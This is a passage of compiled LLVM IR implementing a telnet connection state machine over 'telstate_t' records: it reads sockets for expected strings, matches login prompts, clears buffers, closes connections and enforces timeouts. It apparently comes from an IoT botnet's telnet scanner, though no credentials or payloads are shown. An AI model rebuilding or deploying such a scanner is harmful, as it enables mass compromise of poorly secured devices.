  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1522, i32 0, i32 2
  store i8 0, i8* %1523, align 8
  %1524 = load i32, i32* %2, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 3
  store i8 1, i8* %1527, align 1
  br label %2054

1528:                                             ; preds = %1500
  %1529 = load i32, i32* %2, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 2
  store i8 7, i8* %1532, align 8
  br label %1533

1533:                                             ; preds = %1528
  %1534 = load i32, i32* %2, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1536, i32 0, i32 8
  %1538 = load i8*, i8** %1537, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1538, i8 0, i64 1024, i1 false)
  br label %2054

1539:                                             ; preds = %1445
  %1540 = load i32, i32* %2, align 4
  %1541 = sext i32 %1540 to i64
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1541
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1542, i32 0, i32 0
  %1544 = load i32, i32* %1543, align 16
  %1545 = load i32, i32* %2, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 8
  %1549 = load i8*, i8** %1548, align 8
  %1550 = load i32, i32* %2, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1551
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1552, i32 0, i32 7
  %1554 = load i16, i16* %1553, align 16
  %1555 = zext i16 %1554 to i32
  %1556 = call i32 @readUntil(i32 noundef %1544, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1549, i32 noundef 1024, i32 noundef %1555)
  %1557 = icmp ne i32 %1556, 0
  br i1 %1557, label %1558, label %1633

1558:                                             ; preds = %1539
  %1559 = load i32, i32* %2, align 4
  %1560 = sext i32 %1559 to i64
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1560
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1561, i32 0, i32 6
  store i32 0, i32* %1562, align 4
  %1563 = load i32, i32* %2, align 4
  %1564 = sext i32 %1563 to i64
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1564
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1565, i32 0, i32 7
  store i16 0, i16* %1566, align 16
  %1567 = load i32, i32* %2, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1568
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1569, i32 0, i32 8
  %1571 = load i8*, i8** %1570, align 8
  %1572 = call i8* @strstr(i8* noundef %1571, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #11
  %1573 = icmp ne i8* %1572, null
  br i1 %1573, label %1574, label %1594

1574:                                             ; preds = %1558
  %1575 = load i32, i32* %2, align 4
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1576
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1577, i32 0, i32 8
  %1579 = load i8*, i8** %1578, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1579, i8 0, i64 1024, i1 false)
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 0
  %1584 = load i32, i32* %1583, align 16
  %1585 = call i32 @sclose(i32 noundef %1584)
  %1586 = load i32, i32* %2, align 4
  %1587 = sext i32 %1586 to i64
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1587
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1588, i32 0, i32 2
  store i8 0, i8* %1589, align 8
  %1590 = load i32, i32* %2, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1591
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1592, i32 0, i32 3
  store i8 0, i8* %1593, align 1
  br label %2054

1594:                                             ; preds = %1558
  %1595 = load i32, i32* %2, align 4
  %1596 = sext i32 %1595 to i64
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1596
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1597, i32 0, i32 8
  %1599 = load i8*, i8** %1598, align 8
  %1600 = call i32 @matchPrompt(i8* noundef %1599)
  %1601 = icmp ne i32 %1600, 0
  br i1 %1601, label %1622, label %1602

1602:                                             ; preds = %1594
  %1603 = load i32, i32* %2, align 4
  %1604 = sext i32 %1603 to i64
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1604
  %1606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1605, i32 0, i32 8
  %1607 = load i8*, i8** %1606, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1607, i8 0, i64 1024, i1 false)
  %1608 = load i32, i32* %2, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1609
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1610, i32 0, i32 0
  %1612 = load i32, i32* %1611, align 16
  %1613 = call i32 @sclose(i32 noundef %1612)
  %1614 = load i32, i32* %2, align 4
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1615
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1616, i32 0, i32 2
  store i8 0, i8* %1617, align 8
  %1618 = load i32, i32* %2, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1619
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1620, i32 0, i32 3
  store i8 1, i8* %1621, align 1
  br label %2054

1622:                                             ; preds = %1594
  %1623 = load i32, i32* %2, align 4
  %1624 = sext i32 %1623 to i64
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1624
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1625, i32 0, i32 2
  store i8 7, i8* %1626, align 8
  br label %1627

1627:                                             ; preds = %1622
  %1628 = load i32, i32* %2, align 4
  %1629 = sext i32 %1628 to i64
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1629
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1630, i32 0, i32 8
  %1632 = load i8*, i8** %1631, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1632, i8 0, i64 1024, i1 false)
  br label %2054

1633:                                             ; preds = %1539
  %1634 = load i32, i32* %2, align 4
  %1635 = sext i32 %1634 to i64
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1635
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1636, i32 0, i32 0
  %1638 = load i32, i32* %1637, align 16
  %1639 = load i32, i32* %2, align 4
  %1640 = sext i32 %1639 to i64
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1640
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1641, i32 0, i32 8
  %1643 = load i8*, i8** %1642, align 8
  %1644 = load i32, i32* %2, align 4
  %1645 = sext i32 %1644 to i64
  %1646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1645
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1646, i32 0, i32 7
  %1648 = load i16, i16* %1647, align 16
  %1649 = zext i16 %1648 to i32
  %1650 = call i32 @readUntil(i32 noundef %1638, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1643, i32 noundef 1024, i32 noundef %1649)
  %1651 = icmp ne i32 %1650, 0
  br i1 %1651, label %1652, label %1727

1652:                                             ; preds = %1633
  %1653 = load i32, i32* %2, align 4
  %1654 = sext i32 %1653 to i64
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1654
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1655, i32 0, i32 6
  store i32 0, i32* %1656, align 4
  %1657 = load i32, i32* %2, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 7
  store i16 0, i16* %1660, align 16
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 8
  %1665 = load i8*, i8** %1664, align 8
  %1666 = call i8* @strstr(i8* noundef %1665, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #11
  %1667 = icmp ne i8* %1666, null
  br i1 %1667, label %1668, label %1688

1668:                                             ; preds = %1652
  %1669 = load i32, i32* %2, align 4
  %1670 = sext i32 %1669 to i64
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1670
  %1672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1671, i32 0, i32 8
  %1673 = load i8*, i8** %1672, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1673, i8 0, i64 1024, i1 false)
  %1674 = load i32, i32* %2, align 4
  %1675 = sext i32 %1674 to i64
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 0
  %1678 = load i32, i32* %1677, align 16
  %1679 = call i32 @sclose(i32 noundef %1678)
  %1680 = load i32, i32* %2, align 4
  %1681 = sext i32 %1680 to i64
  %1682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1681
  %1683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1682, i32 0, i32 2
  store i8 0, i8* %1683, align 8
  %1684 = load i32, i32* %2, align 4
  %1685 = sext i32 %1684 to i64
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1685
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1686, i32 0, i32 3
  store i8 0, i8* %1687, align 1
  br label %2054

1688:                                             ; preds = %1652
  %1689 = load i32, i32* %2, align 4
  %1690 = sext i32 %1689 to i64
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1690
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1691, i32 0, i32 8
  %1693 = load i8*, i8** %1692, align 8
  %1694 = call i32 @matchPrompt(i8* noundef %1693)
  %1695 = icmp ne i32 %1694, 0
  br i1 %1695, label %1716, label %1696

1696:                                             ; preds = %1688
  %1697 = load i32, i32* %2, align 4
  %1698 = sext i32 %1697 to i64
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1698
  %1700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1699, i32 0, i32 8
  %1701 = load i8*, i8** %1700, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1701, i8 0, i64 1024, i1 false)
  %1702 = load i32, i32* %2, align 4
  %1703 = sext i32 %1702 to i64
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1703
  %1705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1704, i32 0, i32 0
  %1706 = load i32, i32* %1705, align 16
  %1707 = call i32 @sclose(i32 noundef %1706)
  %1708 = load i32, i32* %2, align 4
  %1709 = sext i32 %1708 to i64
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 2
  store i8 0, i8* %1711, align 8
  %1712 = load i32, i32* %2, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1713
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1714, i32 0, i32 3
  store i8 1, i8* %1715, align 1
  br label %2054

1716:                                             ; preds = %1688
  %1717 = load i32, i32* %2, align 4
  %1718 = sext i32 %1717 to i64
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1718
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1719, i32 0, i32 2
  store i8 7, i8* %1720, align 8
  br label %1721

1721:                                             ; preds = %1716
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 8
  %1726 = load i8*, i8** %1725, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1726, i8 0, i64 1024, i1 false)
  br label %2054

1727:                                             ; preds = %1633
  %1728 = load i32, i32* %2, align 4
  %1729 = sext i32 %1728 to i64
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1729
  %1731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1730, i32 0, i32 0
  %1732 = load i32, i32* %1731, align 16
  %1733 = load i32, i32* %2, align 4
  %1734 = sext i32 %1733 to i64
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 8
  %1737 = load i8*, i8** %1736, align 8
  %1738 = load i32, i32* %2, align 4
  %1739 = sext i32 %1738 to i64
  %1740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1739
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1740, i32 0, i32 7
  %1742 = load i16, i16* %1741, align 16
  %1743 = zext i16 %1742 to i32
  %1744 = call i32 @readUntil(i32 noundef %1732, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1737, i32 noundef 1024, i32 noundef %1743)
  %1745 = icmp ne i32 %1744, 0
  br i1 %1745, label %1746, label %1821

1746:                                             ; preds = %1727
  %1747 = load i32, i32* %2, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1748
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1749, i32 0, i32 6
  store i32 0, i32* %1750, align 4
  %1751 = load i32, i32* %2, align 4
  %1752 = sext i32 %1751 to i64
  %1753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1752
  %1754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1753, i32 0, i32 7
  store i16 0, i16* %1754, align 16
  %1755 = load i32, i32* %2, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1756
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1757, i32 0, i32 8
  %1759 = load i8*, i8** %1758, align 8
  %1760 = call i8* @strstr(i8* noundef %1759, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #11
  %1761 = icmp ne i8* %1760, null
  br i1 %1761, label %1762, label %1782

1762:                                             ; preds = %1746
  %1763 = load i32, i32* %2, align 4
  %1764 = sext i32 %1763 to i64
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1764
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1765, i32 0, i32 8
  %1767 = load i8*, i8** %1766, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1767, i8 0, i64 1024, i1 false)
  %1768 = load i32, i32* %2, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1769
  %1771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1770, i32 0, i32 0
  %1772 = load i32, i32* %1771, align 16
  %1773 = call i32 @sclose(i32 noundef %1772)
  %1774 = load i32, i32* %2, align 4
  %1775 = sext i32 %1774 to i64
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1775
  %1777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1776, i32 0, i32 2
  store i8 0, i8* %1777, align 8
  %1778 = load i32, i32* %2, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1780, i32 0, i32 3
  store i8 0, i8* %1781, align 1
  br label %2054

1782:                                             ; preds = %1746
  %1783 = load i32, i32* %2, align 4
  %1784 = sext i32 %1783 to i64
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1784
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1785, i32 0, i32 8
  %1787 = load i8*, i8** %1786, align 8
  %1788 = call i32 @matchPrompt(i8* noundef %1787)
  %1789 = icmp ne i32 %1788, 0
  br i1 %1789, label %1810, label %1790

1790:                                             ; preds = %1782
  %1791 = load i32, i32* %2, align 4
  %1792 = sext i32 %1791 to i64
  %1793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1792
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1793, i32 0, i32 8
  %1795 = load i8*, i8** %1794, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1795, i8 0, i64 1024, i1 false)
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 0
  %1800 = load i32, i32* %1799, align 16
  %1801 = call i32 @sclose(i32 noundef %1800)
  %1802 = load i32, i32* %2, align 4
  %1803 = sext i32 %1802 to i64
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1803
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1804, i32 0, i32 2
  store i8 0, i8* %1805, align 8
  %1806 = load i32, i32* %2, align 4
  %1807 = sext i32 %1806 to i64
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1807
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1808, i32 0, i32 3
  store i8 1, i8* %1809, align 1
  br label %2054

1810:                                             ; preds = %1782
  %1811 = load i32, i32* %2, align 4
  %1812 = sext i32 %1811 to i64
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1812
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1813, i32 0, i32 2
  store i8 7, i8* %1814, align 8
  br label %1815

1815:                                             ; preds = %1810
  %1816 = load i32, i32* %2, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1817
  %1819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1818, i32 0, i32 8
  %1820 = load i8*, i8** %1819, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1820, i8 0, i64 1024, i1 false)
  br label %2054

1821:                                             ; preds = %1727
  %1822 = load i32, i32* %2, align 4
  %1823 = sext i32 %1822 to i64
  %1824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1823
  %1825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1824, i32 0, i32 0
  %1826 = load i32, i32* %1825, align 16
  %1827 = load i32, i32* %2, align 4
  %1828 = sext i32 %1827 to i64
  %1829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1828
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1829, i32 0, i32 8
  %1831 = load i8*, i8** %1830, align 8
  %1832 = load i32, i32* %2, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 7
  %1836 = load i16, i16* %1835, align 16
  %1837 = zext i16 %1836 to i32
  %1838 = call i32 @readUntil(i32 noundef %1826, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1831, i32 noundef 1024, i32 noundef %1837)
  %1839 = icmp ne i32 %1838, 0
  br i1 %1839, label %1840, label %1915

1840:                                             ; preds = %1821
  %1841 = load i32, i32* %2, align 4
  %1842 = sext i32 %1841 to i64
  %1843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1842
  %1844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1843, i32 0, i32 6
  store i32 0, i32* %1844, align 4
  %1845 = load i32, i32* %2, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1846
  %1848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1847, i32 0, i32 7
  store i16 0, i16* %1848, align 16
  %1849 = load i32, i32* %2, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1850
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1851, i32 0, i32 8
  %1853 = load i8*, i8** %1852, align 8
  %1854 = call i8* @strstr(i8* noundef %1853, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #11
  %1855 = icmp ne i8* %1854, null
  br i1 %1855, label %1856, label %1876

1856:                                             ; preds = %1840
  %1857 = load i32, i32* %2, align 4
  %1858 = sext i32 %1857 to i64
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1858
  %1860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1859, i32 0, i32 8
  %1861 = load i8*, i8** %1860, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1861, i8 0, i64 1024, i1 false)
  %1862 = load i32, i32* %2, align 4
  %1863 = sext i32 %1862 to i64
  %1864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1863
  %1865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1864, i32 0, i32 0
  %1866 = load i32, i32* %1865, align 16
  %1867 = call i32 @sclose(i32 noundef %1866)
  %1868 = load i32, i32* %2, align 4
  %1869 = sext i32 %1868 to i64
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1869
  %1871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1870, i32 0, i32 2
  store i8 0, i8* %1871, align 8
  %1872 = load i32, i32* %2, align 4
  %1873 = sext i32 %1872 to i64
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1873
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1874, i32 0, i32 3
  store i8 0, i8* %1875, align 1
  br label %2054

1876:                                             ; preds = %1840
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 8
  %1881 = load i8*, i8** %1880, align 8
  %1882 = call i32 @matchPrompt(i8* noundef %1881)
  %1883 = icmp ne i32 %1882, 0
  br i1 %1883, label %1904, label %1884

1884:                                             ; preds = %1876
  %1885 = load i32, i32* %2, align 4
  %1886 = sext i32 %1885 to i64
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 8
  %1889 = load i8*, i8** %1888, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1889, i8 0, i64 1024, i1 false)
  %1890 = load i32, i32* %2, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1891
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1892, i32 0, i32 0
  %1894 = load i32, i32* %1893, align 16
  %1895 = call i32 @sclose(i32 noundef %1894)
  %1896 = load i32, i32* %2, align 4
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1897
  %1899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1898, i32 0, i32 2
  store i8 0, i8* %1899, align 8
  %1900 = load i32, i32* %2, align 4
  %1901 = sext i32 %1900 to i64
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1901
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1902, i32 0, i32 3
  store i8 1, i8* %1903, align 1
  br label %2054

1904:                                             ; preds = %1876
  %1905 = load i32, i32* %2, align 4
  %1906 = sext i32 %1905 to i64
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1906
  %1908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1907, i32 0, i32 2
  store i8 7, i8* %1908, align 8
  br label %1909

1909:                                             ; preds = %1904
  %1910 = load i32, i32* %2, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1911
  %1913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1912, i32 0, i32 8
  %1914 = load i8*, i8** %1913, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1914, i8 0, i64 1024, i1 false)
  br label %2054

1915:                                             ; preds = %1821
  %1916 = load i32, i32* %2, align 4
  %1917 = sext i32 %1916 to i64
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1918, i32 0, i32 8
  %1920 = load i8*, i8** %1919, align 8
  %1921 = call i64 @strlen(i8* noundef %1920) #11
  %1922 = trunc i64 %1921 to i16
  %1923 = load i32, i32* %2, align 4
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1924
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1925, i32 0, i32 7
  store i16 %1922, i16* %1926, align 16
  br label %1927

1927:                                             ; preds = %1915
  br label %1928

1928:                                             ; preds = %1927
  br label %1929

1929:                                             ; preds = %1928
  br label %1930

1930:                                             ; preds = %1929
  br label %1931

1931:                                             ; preds = %1930
  br label %1932

1932:                                             ; preds = %1931
  br label %1933

1933:                                             ; preds = %1932
  br label %1934

1934:                                             ; preds = %1933
  %1935 = load i32, i32* %2, align 4
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1936
  %1938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1937, i32 0, i32 6
  %1939 = load i32, i32* %1938, align 4
  %1940 = add i32 %1939, 10
  %1941 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1942 = icmp ult i32 %1940, %1941
  br i1 %1942, label %1943, label %1958

1943:                                             ; preds = %1934
  %1944 = load i32, i32* %2, align 4
  %1945 = sext i32 %1944 to i64
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1945
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1946, i32 0, i32 0
  %1948 = load i32, i32* %1947, align 16
  %1949 = call i32 @sclose(i32 noundef %1948)
  %1950 = load i32, i32* %2, align 4
  %1951 = sext i32 %1950 to i64
  %1952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1951
  %1953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1952, i32 0, i32 2
  store i8 0, i8* %1953, align 8
